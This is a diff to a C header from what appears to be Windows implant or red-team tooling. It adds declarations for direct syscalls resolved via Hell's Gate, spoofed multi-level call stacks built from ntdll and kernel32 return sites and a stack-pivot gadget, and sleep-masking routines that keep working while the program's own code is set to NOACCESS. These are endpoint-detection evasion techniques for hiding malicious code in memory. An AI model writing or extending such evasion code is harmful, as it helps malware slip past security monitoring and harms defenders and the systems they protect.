@@ -88,10 +88,11 @@ extern PVOID  g_gadget;
 extern PVOID  g_k32_ret;   /* kernel32 "ret" gadget for single-level call-stack spoof */
 
 /* ── Multi-level call-stack synthesis globals (syscall_stub.asm / callstack.c) */
-extern DWORD  g_wait_ssn;  /* SSN for NtWaitForSingleObject */
-extern PVOID  g_pivot;     /* add rsp,0x20; ret — stack pivot in ntdll .text */
-extern PVOID  g_btt;       /* kernel32!BaseThreadInitThunk return site */
-extern PVOID  g_rtl;       /* ntdll!RtlUserThreadStart return site */
+extern DWORD  g_wait_ssn;    /* SSN for NtWaitForSingleObject */
+extern PVOID  g_pivot;       /* add rsp,0x20; ret — stack pivot in ntdll .text */
+extern PVOID  g_btt;         /* kernel32!BaseThreadInitThunk return site */
+extern PVOID  g_rtl;         /* ntdll!RtlUserThreadStart return site */
+extern DWORD  g_protect_ssn; /* SSN for NtProtectVirtualMemory (used by SlpNtProtect) */
 
 /* ── BCrypt function pointers (defined in crypto.c) ─────────────────────── */
 extern pfnBCryptOpenAlgorithmProvider    pBCryptOpenAlgorithmProvider;
@@ -147,6 +148,19 @@ NTSTATUS SpoofedNtWait(HANDLE hObject, BOOLEAN alertable, PLARGE_INTEGER timeout
 /* ASM trampoline — generic ≤4-reg-arg syscall with multi-level fake call stack.
  * Caller sets g_ssn via HellsGateSetSSN() before calling. */
 NTSTATUS SpoofedSyscall4(PVOID a1, PVOID a2, PVOID a3, PVOID a4);
+
+/* ASM trampoline — syscall with ≥5 args; shadow-space spoof, RSP unchanged.
+ * Caller sets g_ssn via HellsGateSetSSN() before calling. */
+NTSTATUS SpoofedSyscall8(PVOID a1, PVOID a2, PVOID a3, PVOID a4,
+                          PVOID a5, PVOID a6, PVOID a7, PVOID a8);
+
+/* .slpmsk-resident NtProtectVirtualMemory — callable while own .text is NOACCESS.
+ * Signature mirrors NtProtectVirtualMemory: hProc, *pBase, *pSize, newProt, *pOld */
+NTSTATUS SlpNtProtect(HANDLE hProc, PVOID *pBase, SIZE_T *pSize,
+                       ULONG newProt, ULONG *pOld);
+
+/* .slpmsk-resident NtWaitForSingleObject with multi-level fake call stack. */
+NTSTATUS SlpSpoofedWait(HANDLE hEvent, BOOLEAN alertable, PLARGE_INTEGER timeout);
 
 /* crypto.c */
 BOOL CryptoInit(void);
